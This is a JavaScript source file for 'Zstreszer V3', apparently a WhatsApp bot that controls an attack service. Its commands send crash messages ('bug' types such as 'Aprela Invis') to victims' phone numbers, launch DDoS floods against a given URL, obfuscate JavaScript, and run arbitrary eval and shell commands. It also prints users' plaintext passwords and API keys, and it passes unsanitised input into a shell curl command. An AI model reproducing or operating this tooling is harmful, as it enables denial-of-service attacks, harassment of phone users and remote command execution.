require('../../config')
const util = require('util')
const fs = require("fs-extra");
const path = require("path");
const pino = require("pino");
const FormData = require('form-data');
const fetch = require('node-fetch');
const { Boom } = require("@hapi/boom");
const { smsg } = require("./mywhatsapp");
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore, jidDecode, baileys, proto, getContentType, generateWAMessage, generateWAMessageFromContent, generateWAMessageContent,prepareWAMessageMedia, downloadContentFromMessage } = require("@kagenoureal/baileys");
const { addPremiumUser, getPremiumList, delPremiumUser } = require("./premiun");
//=============
const store = makeInMemoryStore({ logger: pino({ level: 'silent' }).child({ stream: 'store' }) });
const sessionFolderPath = path.join(__dirname, '../../sessions');
const usePairingCode = true;
async function removeSessionFolder(folderPath, username) {
if (await fs.pathExists(folderPath)) {
await fs.remove(folderPath);
console.log(`[${username}] Session folder dihapus.`);
}
}
//=============
async function StartSession(username) {
const sessionPath = `${sessionFolderPath}/${username}`;
const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
const browsers = [
["iOS", "Safari", "16.5.1"],
["iOS", "Chrome", "115.0.5790.84"],
["iOS", "Firefox", "118.1"],
["Android", "Chrome", "121.0.0.28"],
["Android", "Edge", "118.0.5993.90"],
["Android", "Opera", "75.3.3760.68875"],
["Android", "Firefox", "118.0"],
["Linux", "Chrome", "20.0.04"],
["Ubuntu","Chrome","20.0.04"],
["Windows", "Chrome", "120.0.6099.71"],
["Windows", "Edge", "119.0.2151.58"],
["Windows", "Firefox", "118.0"]
];
function getRandomBrowser() {
return browsers[Math.floor(Math.random() * browsers.length)];
}
const connectionOptions = {
isLatest: true,
keepAliveIntervalMs: 50000,
printQRInTerminal: !usePairingCode,
logger: pino({ level: "silent" }),
auth: state,
browser: getRandomBrowser(),
};
const conn = makeWASocket(connectionOptions);
store.bind(conn.ev);
global.clientSessions[username] = conn;
conn.ev.on("creds.update", saveCreds);
//==========
conn.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
try { 
if (connection === "close") {
const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
if (
reason === DisconnectReason.loggedOut ||
reason === 405
) {
await removeSessionFolder(sessionPath, username);
StartSession(username);
} else if (reason === 408 || reason === 515 || reason === 428) {
setTimeout(() => {
StartSession(username);
}, 5000);
} else {
console.log(`Disconnected (${reason})`);
}
} else if (connection === "open") {
let id = conn.user?.id?.split(':')[0];
let name = conn.user?.name || 'Unknown';
console.log(`[${username}] Connected as ${name} (${id})`);
const existingClientIndex = global.connectedClients.findIndex(c => c.username === username);
if (existingClientIndex !== -1) {
global.connectedClients[existingClientIndex] = { username, id, name, status: 'connected' };
} else {
global.connectedClients.push({ username, id, name, status: 'connected' });
}
}
} catch (err) {
console.error(`[${username}] Fatal error in connection.update:`, err);
}
});
//=============
conn.ev.on("messages.upsert", async ({ messages, type }) => {
if (!global.cmdwa) return;
if (type !== "notify") return;
const msg = messages[0];
if (!msg?.message || msg.key.remoteJid === "status@broadcast") return;
const m = smsg(conn, msg, store);
try {
let zstres = conn
const body = m.body || "";
const prefix = global.prefix.find(p => body.startsWith(p));
const isCmd = prefix && body.startsWith(prefix); 
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : [];
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = args.join(" ");
//=================
const botNumber = await zstres.decodeJid(zstres.user.id);
const premuser = JSON.parse(fs.readFileSync("./database/Acceswa.json"));
const botId = conn.user.id.split(":")[0]; 
const premList = getPremiumList(botId);
const isAccess = [botNumber, ...global.owner, ...premList.map(n => n + "@s.whatsapp.net")].includes(m.sender);
if (!zstres.public && !isAccess) return;
if (m.message) console.log(`[ PESAN ] ${body || m.mtype} dari ${m.pushName}`);
//=================
const sendCrash = (type, nomor) => {
const memek = (username === global.username)
? global.apikey
: global.db.users[username]?.apiKey;
const perintah = `curl -X POST 'http://localhost:${global.port}/api/send-crash' \
-H 'Content-Type: application/json' \
-H 'x-api-key: ${memek}' \
-d '{"nomor": "${nomor}", "type": "${type}"}'`;
require('child_process').exec(perintah, (err, stdout, stderr) => {
if (err) return m.reply(`❌ Error: ${err.message}`);
if (stdout) return m.reply(`${stdout}`);
});
};
//=================
//thumbnail
const videoList = [
'./public/assets/miyu.mp4',
'./public/assets/chise.mp4',
'./public/assets/sami.mp4',
'./public/assets/mori.mp4',
'./public/assets/mari.mp4',
'./public/assets/koyo.mp4',
'./public/assets/mine.mp4',
'./public/assets/saku.mp4',
'./public/assets/idol.mp4'
];
const memek = videoList[Math.floor(Math.random() * videoList.length)];
//=================
switch (command) {
case 'public':
if (!isAccess) return m.reply(mess.owner);
if (zstres.public) return m.reply("Sudah public");
zstres.public = true;
m.reply(mess.succes);
break;
//=================
case 'self':
if (!isAccess) return m.reply(mess.owner);
if (!zstres.public) return m.reply("Sudah self");
zstres.public = false;
m.reply(mess.succes);
break;
//=================
case 'menu':
m.reply(`*Do You Mean Zstres?*\nExample *: ${prefix}zstres*`)
break
//=================
case 'zstres':
await zstres.sendMessage(m.chat, {
video: fs.readFileSync(memek), 
gifPlayback: true,
caption: 
`╭──〔 *Zstreszer Menu* 〕──╮
│Hello, *${m.pushName}*
│I'am, *Zstreszer V3👋*
├──────────────┤
┌─ *Bot Control / Owner*
│ • ${prefix}self
│ • ${prefix}public
│ • ${prefix}addacces
│ • ${prefix}delacces
│ • ${prefix}clearsesi
┌─ *Web Control / Admin*
│ • ${prefix}owner
│ • ${prefix}cuser
│ • ${prefix}cpremium
│ • ${prefix}cowner
│ • ${prefix}dellacc
│ • ${prefix}listuser
┌─ *Combat / Bug Tools*
│ • ${prefix}send
│ • ${prefix}aprela
│ • ${prefix}violet
│ • ${prefix}album
│ • ${prefix}zstresv1
│ • ${prefix}zstresv2
┌─ *Ddos / 7 Layer*
│ • ${prefix}attack
│ • ${prefix}listmethod
┌─ *Random / Extras Tools*
│ • ${prefix}eval
│ • ${prefix}upload
│ • ${prefix}decrypt
│ • ${prefix}enclow
│ • ${prefix}encmedium
│ • ${prefix}enchard
│ • ${prefix}encextreme
╰──────────────╯`,
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 1,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363400725364805@newsletter",
newsletterName: "© Kagenou - 2025 || Zstreszer",
serverMessageId: 1
}, 
externalAdReply: {
title: "Zstreszer - X",
sourceUrl: global.domain,
mediaType: 1,
thumbnail: fs.readFileSync("./public/assets/Z.jpg")
}
}
}, { quoted: m });
await zstres.sendMessage(m.chat, {
audio: fs.readFileSync('./public/assets/starla.mp3'), 
mimetype: 'audio/mpeg', 
ptt: true
},{quoted: m})
break;
//=================
case 'addacces':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} 60123456789`);
addPremiumUser(botId, text.replace(/\D/g, ""));
m.reply(`✅ Added Premium:\n• ${text}`);
break;
//=================
case 'delacces':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} 60123456789`);
const removed = delPremiumUser(botId, text.replace(/\D/g, ""));
m.reply(removed ? `✅ Premium dihapus:\n• ${text}` : "❌ Nomor tidak ditemukan.");
break;
//=================
//EXTARZ FITUR
case 'upload': {
if (!m.quoted) return m.reply(`❌ Example: Reply Media With Caption ${prefix + command}`);
try {
const apiKey = (username === global.username)
? global.apikey
: global.db.users[username]?.apiKey;
const mime = m.quoted.mimetype;
const buffer = await m.quoted.download();
const ext = mime.split('/')[1] || 'bin';
const filename = `zstres.${ext}`;
const form = new FormData();
form.append('file', buffer, { filename, contentType: mime });
form.append('filename', filename);
const res = await fetch(`http://localhost:${global.port}/api/upload`, {
method: 'POST',
headers: {
'x-api-key': apiKey,
...form.getHeaders()
},
body: form
});
const text = await res.text();
if (!text.startsWith('{')) throw new Error(text);
const { directLink } = JSON.parse(text);
if (!directLink) return m.reply('Upload gagal. Respons tidak valid.');
await m.reply(`Berhasil upload:\n${directLink}`);
} catch (err) {
console.error(err);
await m.reply('Terjadi kesalahan saat upload.');
}
break;
}
//=================
case "eval": {
if (!m.quoted) return m.reply(
`❌ Example: Reply Msg Dengan Caption ${prefix + command}`);
let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
let jeneng = `MessageData_Zstres.json`;
await fs.writeFileSync(jeneng, penis);
await m.reply(penis);
await conn.sendMessage(m.chat, { document: { url: `./${jeneng}` }, fileName: jeneng, mimetype: '*/*' }, { quoted: m });
await fs.unlinkSync(jeneng);
}
break
//================
case "owner":
await m.reply(`╭───〔 💻 Developer Info 〕───╮
│ 👤 Nama: Kagenou
│ 🌍 Asal: _Kelantan, Malaysia_
│ 🧑‍💻 Level: Developer Newbie (15 y/o)
│ ⚙️ Role: Bot Master
│ 🔧 Fokus:
│• Scripting backend, Frontend
│• Bot Devices
│• Combat Tools
├─────────────────
│🔤 Bahasa yang Digunakan:
│🟨 JavaScript
│🔵 HTML/CSS
│🟢 Node.js
│🟣 Python (dasar)
╰─────────────────╯`)
const vcard = `
BEGIN:VCARD
VERSION:3.0
FN:Kagenou Real
ORG:Zstreszer - Dev
TEL;type=CELL;type=VOICE;waid=601112260297:+601112260297
END:VCARD
`.trim();
await conn.sendMessage(m.chat, {
contacts: {
displayName: 'Kagenou Real',
contacts: [{ vcard }]
}
}, { quoted: m });
break;
//================
case 'ping': {
try {
const apiKey = (username === global.username)
? global.apikey
: global.db.users[username]?.apiKey || '';
const res = await fetch(`http://localhost:${global.port}/api/ping`, {
headers: {
'x-api-key': apiKey
}
});
const data = await res.json();
const text = `
🖥️ System Info 🖥️

🌐 OS : ${data.os || 'Unknown'} (${data.arch || 'Unknown'})
🏷️ Host : ${data.host || 'Unknown'}

💾 RAM Total: ${data.ramTotal || 'Unknown'}
📊 RAM Used : ${data.ramUsed || 'Unknown'}
🛋️ RAM Free : ${data.ramFree || 'Unknown'}

⚙️ CPU: ${data.cpuModel || 'Unknown'}
🔢 CPU Cores: ${data.cpuCores || 'Unknown'}

⏳ VPS Uptime: ${data.vpsUptime || 'Unknown'}
🤖 Bot Uptime: ${data.botUptime || 'Unknown'}
`.trim();
await m.reply(text);
} catch (e) {
console.error('Gagal fetch /ping:', e);
await m.reply('Gagal mengambil data system info.');
}
}
break;
//=================
case 'clearsesi':
case 'csesi': {
if (!isAccess) return m.reply(mess.owner);
const folderPath = path.join('./sessions', username);
try {
const files = fs.readdirSync(folderPath).filter(f => f !== 'pairkey.json');
files.forEach(file => fs.unlinkSync(path.join(folderPath, file)));
m.reply(`✅ *Sesi ${username} Dibersihkan*\n• File dihapus: ${files.length}`);
} catch (err) {
console.error(err);
}
break;
}
//=================
case 'attack': {
if (!isAccess) return m.reply(mess.owner);
const args = text.split(" ");
if (args.length < 3) {
return m.reply(`❌ Example: ${prefix + command} <url> <time> <rate> <thread> <mode>\n\nJika mode 'quantum' cukup:\n${prefix + command} <url> <time> quantum`);
}
const [target, time, rate, thread, modeRaw] = args;
const mode = modeRaw?.toLowerCase();
const simpleOnly = ['quantum'];
if (!/^https?:\/\//.test(target)) return m.reply("❌ URL tidak valid (harus http:// atau https://)");
if (isNaN(time)) return m.reply("❌ Time harus berupa angka.");
if (!mode) return m.reply("❌ Mode tidak boleh kosong.");
const body = {
target,
time,
mode,
...(simpleOnly.includes(mode) ? {} : { rate, thread })
};
const apiKey = (username === global.username)
? global.apikey
: global.db.users[username]?.apiKey;
try {
const res = await fetch(`http://localhost:${global.port}/api/send-attack`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'x-api-key': apiKey
},
body: JSON.stringify(body)
});
const data = await res.json();
if (!res.ok) return m.reply(`❌ Gagal: ${data?.error || 'Tidak diketahui.'}`);
m.reply(`✅ Serangan ${mode} dikirim ke:\n${target}\nDurasi: ${time}s\nMode: ${mode}`);
} catch (err) {
console.error(err);
m.reply(`❌ Terjadi kesalahan: ${err.message}`);
}
}
break;
//================
case 'listmethod': {
let teks = 
`📦 *List Method Ddos:*

1: hentai -
2: hold - 
3: flood - 
4: bypass - 
5: quantum -
6: mixmax - 
7: thunder - `;
m.reply(teks);
}
break;
//============
case 'enclow':
case 'encmedium':
case 'enchard':
case 'encextreme': {
if (!m.quoted) return m.reply(
`❌ Example: Reply File Js Dengan Caption ${prefix + command}`);
try {
const apiKey = (username === global.username)
? global.apikey
: global.db.users[username]?.apiKey;
const mime = m.quoted.mimetype;
const buffer = await m.quoted.download();
const filename = `zstres.js`;
const form = new FormData();
form.append('file', buffer, { filename, contentType: mime });
form.append('filename', filename);
const mapType = {
enclow: 'low',
encmedium: 'medium',
enchard: 'hard',
encextreme: 'extreme'
};
form.append('type', mapType[command]);
const res = await fetch(`http://localhost:${global.port}/api/encrypt`, {
method: 'POST',
headers: {
'x-api-key': apiKey,
...form.getHeaders()
},
body: form
});
const json = await res.json();
const encryptedCode = json.encrypted;
const encryptedBuffer = Buffer.from(encryptedCode, 'utf-8');
await conn.sendMessage(m.chat, {
document: encryptedBuffer,
fileName: 'Z-ENC.js',
mimetype: 'application/javascript',
caption: '*Berhasil encrypt*'
}, { quoted: m });
} catch (err) {
console.error(err);
await m.reply('❌ Terjadi kesalahan saat proses enkripsi');
}
break;
}
//=================
case 'decrypt': {
if (!m.quoted) return m.reply(
`❌ Example: Reply File Js Dengan Caption ${prefix + command}`);
try {
const apiKey = (username === global.username)
? global.apikey
: global.db.users[username]?.apiKey;
const mime = m.quoted.mimetype;
const buffer = await m.quoted.download();
const filename = `zstres.js`;
const form = new FormData();
form.append('file', buffer, { filename, contentType: mime });
form.append('filename', filename);
const res = await fetch(`http://localhost:${global.port}/api/decrypt`, {
method: 'POST',
headers: {
'x-api-key': apiKey,
...form.getHeaders()
},
body: form
});
if (!res.ok) {return}
let json;
try {
json = await res.json();
} catch {
const text = await res.text();
}
const decryptedCode = json.decrypted;
const decryptedBuffer = Buffer.from(decryptedCode, 'utf-8');
await conn.sendMessage(m.chat, {
document: decryptedBuffer,
fileName: 'Z-DECRYPT.js',
mimetype: 'application/javascript',
caption: '*Berhasil decrypt*'
}, { quoted: m });
} catch (err) {
console.error(err);
await m.reply('❌ Terjadi kesalahan saat proses dekripsi');
}
break;
}
//=================
//cuser
case 'listuser': {
if (!isAccess) return m.reply(mess.owner);
const apiKey = (username === global.username)
? global.apikey
: global.db.users[username]?.apiKey;
try {
const res = await fetch(`http://localhost:${global.port}/api/list-users`, {
method: 'GET',
headers: {
'x-api-key': apiKey
}
});
const data = await res.json();
if (!res.ok || !data.users) return m.reply(`❌ Gagal: ${data.error}`);
if (data.users.length === 0) return m.reply('❌ Tidak ada user terdaftar.');
let teks = `📋 *Daftar User Terdaftar:*\n\n`;
data.users.forEach((user, i) => {
teks += `*${i + 1}. ${user.username}*\n`;
teks += `• Email: ${user.email}\n`;
teks += `• Password: ${user.password}\n`;
teks += `• Role: ${user.role}\n`;
teks += `• API Key: ${user.apikey}\n`;
teks += `• Usage: ${user.usage}\n\n`;
});
m.reply(teks.trim());
} catch (err) {
console.error(err);
m.reply(`❌ Terjadi kesalahan: ${err.message}`);
}
}
break;
//=================
case 'cuser':
case 'cowner':
case 'cpremium': {
if (!isAccess) return m.reply(mess.owner);
const currentUser = username; 
if (!text) return m.reply(`❌ Example: ${prefix + command} username`);
const [newUsername] = args; 
const randomText = [...Array(5)].map(() => String.fromCharCode(97 + Math.floor(Math.random() * 26))).join('');
const password = `zstres${randomText}`;
const apiKey = (currentUser === global.username)
? global.apikey
: global.db.users[currentUser]?.apiKey;
try {
const roleMap = {
cuser: 'user',
cowner: 'owner',
cpremium: 'premium'
};
const role = roleMap[command] || 'user';
const res = await fetch(`http://localhost:${global.port}/api/create-user`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'x-api-key': apiKey
},
body: JSON.stringify({ username: newUsername, password, role }) 
});
const data = await res.json();
if (!res.ok) return m.reply(`❌ Gagal: ${data.error}`);
const hasil = `✅ User berhasil dibuat:
• Username : ${newUsername}
• Email : ${data.email}
• Password : ${data.password}
• Role : ${data.role}
• API Key : ${data.apiKey}
• Usage : 0
• Domain: ${global.domain}
Gunakan API Key ini untuk mengakses endpoint yang disediakan`
if (m.quoted && m.quoted.sender) {
await conn.sendMessage(m.quoted.sender, { text: hasil }, { quoted: m });
await m.reply('✅ Data akun dikirim ke pengguna');
} else {
await m.reply(hasil);
}
} catch (err) {
console.error(err);
m.reply(`❌ Error: ${err.message}`);
}
}
break;
//=================
case 'dellacc': {
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} Username`);
const email = text + "@Zstres.my"
const pengirim = username; 
const key = pengirim === global.username
? global.apikey
: global.db.users[pengirim]?.apiKey;
try {
const res = await fetch(`http://localhost:${global.port}/api/delete-user`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'x-api-key': key
},
body: JSON.stringify({ email })
});
const data = await res.json();
if (!res.ok) return m.reply(`❌ Gagal: ${data.error}`);
await m.reply(`✅ User: ${email} berhasil dihapus`);
} catch (err) {
console.error(err);
}
}
break;
//=================
//CASE BUG
case 'send':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} <Nomor>`);
sendCrash("testsend", text);
break;
//=================
case 'aprela':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} <Nomor>`);
sendCrash("Aprela Invis", text);
break;
//=================
case 'violet':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} <Nomor>`);
sendCrash("Violet Invis", text);
break;
//=================
case 'album':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} <Nomor>`);
sendCrash("Album Invis", text);
break;
//=================
case 'zstresv1':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} <Nomor>`);
sendCrash("ZstreszerV1", text);
break;
//=================
case 'zstresv2':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} <Nomor>`);
sendCrash("ZstreszerV2", text);
break;
//=================
case 'x': {
if (!isAccess) return m.reply(mess.owner);
try {
let evaled = await eval(text);
if (typeof evaled !== "string") evaled = require("util").inspect(evaled);
await m.reply(evaled);
} catch (err) {
await m.reply(String(err));
}
}
break;
//================
case 'exec': {
if (!isAccess) return m.reply(mess.owner); 
if (!text) return m.reply('Command mana kontol.');
try {
const pengirim = username; 
const key = pengirim === global.username
? global.apikey
: global.db.users[pengirim]?.apiKey;
const res = await fetch(`http://localhost:${global.port}/api/exec`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'x-api-key': key
},
body: JSON.stringify({ command: text })
});
const result = await res.json();
if (!result.success) {
return m.reply(`Gagal:\n${result.message}`);
}
return m.reply(`Output:\n${result.output}`);
} catch (err) {
return m.reply(`Error: ${err.message}`);
}
}
break
//================
}} catch (err) {
console.error("[ERROR]", err);
conn.sendMessage(global.owner, {
text: `*[ERROR]*\n\`\`\`${err.message || err}\`\`\``
});
}});
conn.decodeJid = (jid) => {
if (!jid) return jid;
if (/:\d+@/gi.test(jid)) {
const decode = jidDecode(jid) || {};
return (decode.user && decode.server) ? `${decode.user}@${decode.server}` : jid;
}
return jid;
};
//=============
conn.sendText = async (jid, teks, quoted = '', options = {}) => {
const fakeQuoted = {
key: {
participant: '13135550002@s.whatsapp.net',
remoteJid: "status@broadcast"
},
message: {
pollCreationMessageV3: {
name: "Zstreszer?",
options: [],
selectableOptionsCount: 0
}
}
};
return await conn.sendMessage(jid, { text: teks, mentions: [jid], ...options }, { quoted: fakeQuoted });
};
//=============
conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ""
let messageType = message.mtype ? message.mtype.replace(/Message/gi, "") : mime.split("/")[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await (const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
let type = await FileType.fromBuffer(buffer)
trueFileName = attachExtension ? (filename + "." + type.ext) : filename
// save to file
await fs.writeFileSync(trueFileName, buffer)
return trueFileName
}
//=============
conn.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer
} 
return conn;
}
async function autoStartAllSessions() {
const sessionBase = path.join(__dirname, '../../sessions');
if (!(await fs.pathExists(sessionBase))) return;
const users = (await fs.readdir(sessionBase)).filter(name =>
fs.existsSync(path.join(sessionBase, name, "creds.json"))
);
for (const username of users) {
try {
await StartSession(username);
} catch (err) {
console.error(`[${username}] Failed to start session`, err.message);
}
}
}
//=============
module.exports = { StartSession, autoStartAllSessions, removeSessionFolder };